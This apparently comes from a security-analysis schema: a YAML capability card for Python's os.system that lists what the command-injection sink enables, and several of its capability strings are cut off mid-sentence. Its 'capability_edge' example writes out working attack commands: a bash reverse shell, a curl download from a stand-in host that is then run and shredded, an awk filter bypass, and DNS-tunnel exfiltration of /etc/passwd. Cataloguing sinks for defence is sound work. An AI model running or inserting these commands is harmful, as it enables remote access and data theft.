# os.system

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-f54bf0b8f8c30c4e
api: os.system
api_family: os.system
runtime:
  language: python
  ecosystem: python-runtime
  package: os
  version: legacy-source-bound
capability_class: process-spawn
normative_authority: capability-facts-only
bound_sinks: []
roles:
- role_id: command
  description: Legacy controlled role command.
  bindings:
  - expression: command
    caller_bindable: true
facets:
- facet_id: legacy-facet-917faa99
  capability: Spawn an arbitrary child process via /bin/sh -c, with the attacker-controlled string
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-38a7c7be
  capability: Execute any binary on the system that the process's UID/GID has permission to invoke,
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-aa1ff5a0
  capability: Use shell metacharacters to compose multi-stage pipelines and compound commands
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-c8f59b9a
  capability: Read, write, create, and delete files and directories anywhere the parent process's
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-57c2394a
  capability: 'Exfiltrate data over any network protocol: HTTP/HTTPS (curl -d, wget --post-data),'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-67fed1e1
  capability: Establish interactive reverse shells or bind shells (bash -i >& /dev/tcp/…,
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-c7aada41
  capability: Download and stage second-stage payloads (curl -o /tmp/payload, wget -O,
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-9ebf32b5
  capability: Modify shell configuration for persistence (echo … >> ~/.bashrc, ~/.profile,
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-976b74ff
  capability: Read sensitive local files through the process's own access rights
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-9243b8a8
  capability: Enumerate the host (uname -a, /proc/cpuinfo, lscpu, lsblk, mount, df,
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-ec77dcd0
  capability: Send signals to arbitrary processes (kill, pkill, killall) — terminate,
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-f74f440d
  capability: Modify process scheduling, nice values, and CPU affinity (renice, taskset)
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-9c5f5ef2
  capability: Create named pipes (mkfifo), Unix-domain sockets (nc -U, socat UNIX-LISTEN),
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-89cd81fc
  capability: Load kernel modules (modprobe, insmod) if the calling process has CAP_SYS_MODULE
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-324c1205
  capability: Abuse "living off the land" binaries (GTFOBins) for file read/write/exec
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-4203d334
  capability: 'Chain through interpreters to bypass primitive string filters: embed the'
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-85b87dc2
  capability: Evade naive log detection by prefixing the command line with whitespace
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
- facet_id: legacy-facet-03f5d343
  capability: Consume arbitrary amounts of CPU, memory, disk space, or file descriptors
  role_ids:
  - command
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-9e9fbbae
  role_id: null
  value: Inherits the full environment of the parent process (os.environ), including
  security_effect: Inherits the full environment of the parent process (os.environ), including
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-24b3776b
  role_id: null
  value: Inherits the parent's working directory (os.getcwd()), so relative paths and
  security_effect: Inherits the parent's working directory (os.getcwd()), so relative paths and
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-971f464a
  role_id: null
  value: Inherits the parent's real/effective UID, GID, and supplementary groups,
  security_effect: Inherits the parent's real/effective UID, GID, and supplementary groups,
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-c88311e2
  role_id: null
  value: Inherits the parent's umask, so created files/directories get predictable
  security_effect: Inherits the parent's umask, so created files/directories get predictable
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-ace687eb
  role_id: null
  value: Inherits the parent's file descriptors (0=stdin, 1=stdout, 2=stderr), so
  security_effect: Inherits the parent's file descriptors (0=stdin, 1=stdout, 2=stderr), so
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-a03a4fad
  role_id: null
  value: Uses /bin/sh as the shell interpreter (not always bash; on many systems sh
  security_effect: Uses /bin/sh as the shell interpreter (not always bash; on many systems sh
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-bede43e4
  role_id: null
  value: Returns the exit status in a platform-dependent format encoded by the
  security_effect: Returns the exit status in a platform-dependent format encoded by the
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-83125a6b
  role_id: null
  value: Has no built-in timeout; the call blocks the calling thread until the
  security_effect: Has no built-in timeout; the call blocks the calling thread until the
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-fda12e33
  role_id: null
  value: Shell redirections, pipes, and backgrounding (&) operate on the parent's
  security_effect: Shell redirections, pipes, and backgrounding (&) operate on the parent's
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: 'import os

    ret = os.system("ls -la /tmp")

    print(f"exit status: {ret}")

    '
  capability_edge: "import os\n\n# Reverse shell: bash connects back to attacker-controlled IP on port 4444,\n# redirecting stdin/stdout/stderr through the TCP socket descriptor.\nos.system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")\n\n# Multi-stage: download a second-stage payload, make it executable, run it\n# in background, then erase the binary from disk to reduce forensic footprint.\nos.system(\n    \"curl -s -o /tmp/.agent https://evil.example/payload && \"\n    \"chmod +x /tmp/.agent && \"\n    \"nohup /tmp/.agent &>/dev/null & \"\n    \"sleep 2 && shred -u /tmp/.agent\"\n)\n\n# Living-off-the-land: use awk to execute a command, avoiding /bin/sh -c\n# (bypasses simplistic filters that block semicolons or && in the string).\nos.system(\"awk 'BEGIN {system(\\\"id; uname -a\\\")}' /etc/hosts\")\n\n# Data exfiltration via DNS tunneling: encode sensitive file content as\n# subdomains of an attacker-controlled DNS zone.\nos.system(\n    \"xxd -p /etc/passwd | tr -d '\\\\n' | \"\n    \"\
    fold -w 48 | while read chunk; do \"\n    \"  dig +short $chunk.exfil.example; \"\n    \"done\"\n)\n"
provenance:
- https://docs.python.org/3/library/os.html#os.system
- https://gtfobins.github.io/
- CWE-78 OS Command Injection
```
